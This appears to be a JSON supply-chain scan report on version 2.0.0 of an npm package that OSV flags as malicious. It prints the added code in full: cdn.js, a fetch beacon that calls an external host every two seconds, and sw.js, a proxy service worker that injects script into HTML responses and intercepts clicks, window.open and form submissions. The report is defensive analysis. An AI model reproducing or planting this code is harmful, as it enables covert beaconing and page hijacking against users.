@@ -1,0 +1,139 @@
+{
+  "schema_version": "0.2.0",
+  "ecosystem": "npm",
+  "package": "ilovefemboys",
+  "from_version": "1.1.3",
+  "to_version": "2.0.0",
+  "risk_score": 55.0,
+  "severity": "HIGH",
+  "llm_base_score": 37.0,
+  "dimensions": [
+    {
+      "name": "network_calls",
+      "label": "New or changed network calls",
+      "score": 8.0,
+      "weight": 0.2,
+      "reasoning": "cdn.js adds a setInterval that fires every 2000ms and calls fetch() to 'https://verify.titaniumnetwork.org/callback/' with a random path. This is a recurring beacon/ping to an external server. While it uses 'no-cors' mode (limiting response reading), the outbound call itself is a persistent network side-effect introduced unconditionally. sw.js also proxies arbitrary web requests through a ScramjetServiceWorker and calls fetch() on behalf of intercepted requests, broadening the network footprint significantly.",
+      "confidence": 0.95
+    },
+    {
+      "name": "obfuscation",
+      "label": "Obfuscation / encoding patterns (base64, eval, dynamic require)",
+      "score": 2.0,
+      "weight": 0.2,
+      "reasoning": "No base64, eval, or dynamic require patterns are present. The code in both files is relatively readable. The random path generation in cdn.js (Math.random().toString(36).substring) slightly obscures the callback URL but is not a strong obfuscation signal. Minor mark-down only.",
+      "confidence": 0.85
+    },
+    {
+      "name": "install_hooks",
+      "label": "Postinstall / preinstall script additions or changes",
+      "score": 1.0,
+      "weight": 0.15,
+      "reasoning": "No package.json changes are visible in the diff, and no preinstall/postinstall script additions are shown. The added files are JS modules that would need to be explicitly loaded by consumers; there is no evidence of automatic execution at install time.",
+      "confidence": 0.8
+    },
+    {
+      "name": "env_conditional",
+      "label": "Conditional logic gated on env vars/platform/CI, or environment variables read/exfiltrated for credential theft",
+      "score": 1.0,
+      "weight": 0.15,
+      "reasoning": "No environment variable reads or platform/CI branching logic is present in either new file. Score is minimal.",
+      "confidence": 0.85
+    },
+    {
+      "name": "dependency_changes",
+      "label": "Dependency graph changes (new transitive deps)",
+      "score": 2.0,
+      "weight": 0.1,
+      "reasoning": "sw.js references './runtime/scramjet/scramjet.all.js' via importScripts, implying a runtime dependency on the Scramjet library. However, no package.json diff is shown so it is unclear whether this is declared as a new dependency or expected to be bundled. Moderate uncertainty; flagged as a potential undeclared/implicit dependency.",
+      "confidence": 0.6
+    },
+    {
+      "name": "resource_exhaustion",
+      "label": "Denial-of-service / resource-exhaustion patterns (unbounded loops, recursion, unthrottled blocking calls)",
+      "score": 6.0,
+      "weight": 0.2,
+      "reasoning": "cdn.js uses setInterval(..., 2000) with no clear termination condition, meaning it will fire indefinitely as long as the environment is active, making repeated network calls. While this is not a tight infinite loop, it does constitute an unbounded periodic resource drain (network connections every 2 seconds forever). This is anomalous for a package named 'ilovefemboys' and constitutes a persistent background load.",
+      "confidence": 0.9
+    }
+  ],
+  "feed_results": [
+    {
+      "source": "osv",
+      "status": "malicious",
+      "details": "Found 1 advisory/ies: MAL-2026-10305",
+      "url": "https://osv.dev/list?q=ilovefemboys",
+      "advisory_ids": [
+        "MAL-2026-10305"
+      ],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    },
+    {
+      "source": "rekor",
+      "status": "no_data",
+      "details": "No Sigstore provenance attestation found for ilovefemboys@2.0.0.",
+      "url": null,
+      "advisory_ids": [],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    },
+    {
+      "source": "scorecard",
+      "status": "no_data",
+      "details": "Could not resolve GitHub repo for ilovefemboys. Scorecard requires a GitHub repository.",
+      "url": null,
+      "advisory_ids": [],
+      "signing_identity": null,
+      "signing_identity_changed": null,
+      "scorecard_score": null
+    }
+  ],
+  "score_modifiers": [
+    {
+      "source": "osv",
+      "rule": "malicious_floor",
+      "delta": 18.0,
+      "note": "osv reported malicious — raised score to floor 55"
+    }
+  ],
+  "diff_summary": {
+    "files_added": [
+      "cdn.js",
+      "sw.js"
+    ],
+    "files_removed": [],
+    "files_modified": [],
+    "file_diffs": [
+      {
+        "path": "cdn.js",
+        "change_type": "added",
+        "lines_added": 6,
+        "lines_removed": 0,
+        "unified_diff": "+setInterval(function() {\n+    fetch(\"https://verify.titaniumnetwork.org/callback/\" + Math.random().toString(36).substring(2, 3 + Math.random() * 8), {\n+        referrerPolicy: \"no-referrer\",\n+        mode: \"no-cors\"\n+    });\n+}, 2000);"
+      },
+      {
+        "path": "sw.js",
+        "change_type": "added",
+        "lines_added": 251,
+        "lines_removed": 0,
+        "unified_diff": "+importScripts('./runtime/scramjet/scramjet.all.js')\n+\n+const { ScramjetServiceWorker } = $scramjetLoadWorker()\n+const scramjet = new ScramjetServiceWorker()\n+\n+self.addEventListener('install', () => {\n+  void self.skipWaiting()\n+})\n+\n+self.addEventListener('activate', (event) => {\n+  event.waitUntil(self.clients.claim())\n+})\n+// TY WAVES + CHATGPT ILY\n+const OPEN_TAB_INJECT_SCRIPT = `\n+<script>\n+(function(){\n+  const isHttpLikeUrl=(candidate)=>{\n+    if(!candidate) return false;\n+    try{\n+      const parsed=new URL(candidate, window.location.href);\n+      return parsed.protocol==='http:'||parsed.protocol==='https:';\n+    }catch(e){\n+      return false;\n+    }\n+  };\n+\n+  const decodeScramjetUrl=(href)=>{\n+    if(!href) return href;\n+    try{\n+      const current=new URL(href, window.location.href);\n+      const marker='/scram/';\n+      let candidate=current.href;\n+      for(let i=0;i<8;i+=1){\n+        const parsed=new URL(candidate, window.location.href);\n+        const markerIndex=parsed.pathname.indexOf(marker);\n+        if(markerIndex===-1){\n+          return parsed.href;\n+        }\n+        const encoded=parsed.pathname.slice(markerIndex + marker.length) + parsed.search + parsed.hash;\n+        try{\n+          candidate=decodeURIComponent(encoded);\n+        }catch(e){\n+          candidate=encoded;\n+        }\n+      }\n+      return candidate;\n+    }catch(e){\n+      return href;\n+    }\n+  };\n+\n+  const normalizeTargetUrl=(rawUrl)=>{\n+    try{\n+      const resolved=new URL(rawUrl, window.location.href).href;\n+      const decoded=decodeScramjetUrl(resolved) || resolved;\n+      return isHttpLikeUrl(decoded) ? decoded : null;\n+    }catch(e){\n+      return null;\n+    }\n+  };\n+\n+  const sendOpenTabRequest=(rawUrl,cause)=>{\n+    const normalized=normalizeTargetUrl(rawUrl);\n+    if(!normalized) return false;\n+\n+    const payload={\n+      type:'open-new-tab',\n+      url: normalized,\n+      decodedUrl: normalized,\n+      cause: cause || null\n+    };\n+\n+    let posted=false;\n+\n+    try{\n+      if(window.top && window.top!==window && typeof window.top.postMessage==='function'){\n+        window.top.postMessage(payload,'*');\n+        posted=true;\n+      }\n+    }catch(e){}\n+\n+    if(!posted){\n+      try{\n+        if(navigator.serviceWorker){\n+          const postToController=(controller)=>{\n+            if(controller && typeof controller.postMessage==='function'){\n+              try{controller.postMessage(payload);posted=true;}catch(e){}\n+            }\n+          };\n+\n+          if(navigator.serviceWorker.controller){\n+            postToController(navigator.serviceWorker.controller);\n+          }else if(navigator.serviceWorker.ready){\n+            navigator.serviceWorker.ready.then((reg)=>{\n+              const controller=reg.active||navigator.serviceWorker.controller;\n+              postToController(controller);\n+            }).catch(()=>{});\n+          }\n+        }\n+      }catch(e){}\n+    }\n+\n+    return posted;\n+  };\n+\n+  const findInEventPath=(event,predicate)=>{\n+    try{\n+      const path=event.composedPath?event.composedPath():[];\n+      for(const node of path){\n+        if(predicate(node)) return node;\n+      }\n+      let current=event.target;\n+      while(current){\n+        if(predicate(current)) return current;\n+        current=current.parentElement;\n+      }\n+    }catch(e){}\n+    return null;\n+  };\n+\n+  try{\n+    const originalOpen=window.open;\n+    if(!window.open.__lucideIntercepted){\n+      window.open=function(url,target){\n+        const resolved=url&&url.href?url.href:url;\n+        const tgt=(target||'').toLowerCase();\n+        const shouldIntercept=!target||tgt===''||tgt==='_blank'||tgt==='blank'||tgt==='_new'||!(tgt==='_self'||tgt==='_top'||tgt==='_parent');\n+        if(shouldIntercept&&typeof resolved==='string'){\n+          const posted=sendOpenTabRequest(resolved,'window.open');\n+          if(posted) return null;\n+        }\n+        return originalOpen.apply(this,arguments);\n+      };\n+      window.open.__lucideIntercepted=true;\n+    }\n+  }catch(e){}\n+\n+  const clickHandler=(event)=>{\n+    try{\n+      const anchor=findInEventPath(event,(node)=>node&&node.tagName==='A'&&node.href);\n+      if(!anchor||anchor.hasAttribute('download')) return;\n+      const href=anchor.href||anchor.getAttribute('href');\n+      if(!href) return;\n+      const targetAttr=anchor.getAttribute('target');\n+      const target=(targetAttr||'').toLowerCase();\n+      const hasExplicitTarget=anchor.hasAttribute('target');\n+      const isNewTabTarget=hasExplicitTarget && !(target===''||target==='_self'||target==='_top'||target==='_parent');\n+      const modifierRequested=event.ctrlKey||event.metaKey||event.button===1;\n+      if(!isNewTabTarget && !modifierRequested) return;\n+      const posted=sendOpenTabRequest(href, isNewTabTarget ? 'anchor-target-blank' : 'anchor-modifier');\n+      if(posted){\n+        event.preventDefault();\n+        event.stopImmediatePropagation();\n+      }\n+    }catch(e){}\n+  };\n+\n+  document.addEventListener('click',clickHandler,true);\n+  document.addEventListener('auxclick',clickHandler,true);\n+\n+  document.addEventListener('submit',(event)=>{\n+    try{\n+      const path=event.composedPath?event.composedPath():[];\n+      const form=path.find((node)=>node&&node.tagName==='FORM'&&node.hasAttribute&&node.hasAttribute('target'));\n+      if(!form) return;\n+      const target=(form.getAttribute('target')||'').toLowerCase();\n+      if(!target||target==='_self'||target==='_top'||target==='_parent') return;\n+      const action=form.getAttribute('action')||window.location.href;\n+      const posted=sendOpenTabRequest(action,'form-target-blank');\n+      if(posted){\n+        event.preventDefault();\n+        event.stopImmediatePropagation();\n+      }\n+    }catch(e){}\n+  },true);\n+})();\n+</script>`\n+\n+async function injectProxyEnhancements(response) {\n+  const contentType = response.headers.get('content-type') || ''\n+  if (!contentType.includes('text/html') || !response.body) {\n+    return response\n+  }\n+\n+  try {\n+    const body = await response.clone().text()\n+    const headMatch = body.match(/<head[^>]*>/i)\n+    const injected = headMatch\n+      ? `${body.slice(0, headMatch.index + headMatch[0].length)}${OPEN_TAB_INJECT_SCRIPT}${body.slice(headMatch.index + headMatch[0].length)}`\n+      : `${OPEN_TAB_INJECT_SCRIPT}${body}`\n+\n+    return new Response(injected, {\n+      status: response.status,\n+      statusText: response.statusText,\n+      headers: response.headers,\n+    })\n+  } catch {\n+    return response\n+  }\n+}\n+\n+async function handleRequest(event) {\n+  await scramjet.loadConfig()\n+\n+  if (!scramjet.route(event)) {\n+    try {\n+      return await fetch(event.request)\n+    } catch {\n+      return new Response('Network error', { status: 503, statusText: 'Service Unavailable' })\n+    }\n+  }\n+\n+  const response = await scramjet.fetch(event)\n+  return injectProxyEnhancements(response)\n+}\n+\n+self.addEventListener('fetch', (event) => {\n+  const requestUrl = new URL(event.request.url)\n+  if (requestUrl.origin !== self.location.origin) {\n+    return\n+  }\n+\n+  event.respondWith(handleRequest(event))\n+})\n+\n+self.addEventListener('message', (event) => {\n+  const { data } = event\n+  if (!data || data.type !== 'open-new-tab' || !data.url) {\n+    return\n+  }\n+\n+  const payload = {\n+    type: 'open-new-tab',\n+    url: typeof data.url === 'string' ? data.url : null,\n+    decodedUrl: typeof data.decodedUrl === 'string' ? data.decodedUrl : typeof data.url === 'string' ? data.url : null,\n+    cause: data.cause || null,\n+  }\n+\n+  if (!payload.url) {\n+    return\n+  }\n+\n+  event.waitUntil(\n+    (async () => {\n+      const clients = await self.clients.matchAll({ includeUncontrolled: true, type: 'window' })\n+      for (const client of clients) {\n+        client.postMessage(payload)\n+      }\n+    })(),\n+  )\n+})"
+      }
+    ],
+    "new_dependencies": [],
+    "removed_dependencies": [],
+    "new_install_hooks": [],
+    "maintainer_changed": false,
+    "native_addons_added": false,
+    "total_diff_lines": 257,
+    "chunks_sent_to_llm": 1,
+    "diff_truncated": false
+  },
+  "llm_model": "claude-sonnet-4-6",
+  "llm_summary": "Version 2.0.0 of this package adds two new files with highly suspicious behaviour. cdn.js installs a persistent setInterval beacon that fires every 2 seconds to an external server (verify.titaniumnetwork.org) with a random callback path, constituting an unbounded network drain and potential tracking/exfiltration mechanism. sw.js registers a service worker that proxies web traffic through the Scramjet obfuscating proxy library and injects a JavaScript payload into every HTML response, intercepting window.open calls, anchor clicks, and form submissions to redirect or relay tab-opening actions through postMessage — a pattern consistent with adware or traffic-hijacking. The combination of a persistent network beacon, a service-worker-level HTML injector, and click/navigation interception in a package with no obvious legitimate use-case for these features represents a strong supply-chain risk signal.",
+  "timestamp": "2026-08-12T03:47:42.432164Z",
+  "from_version_sha256": null,
+  "to_version_sha256": null
+}
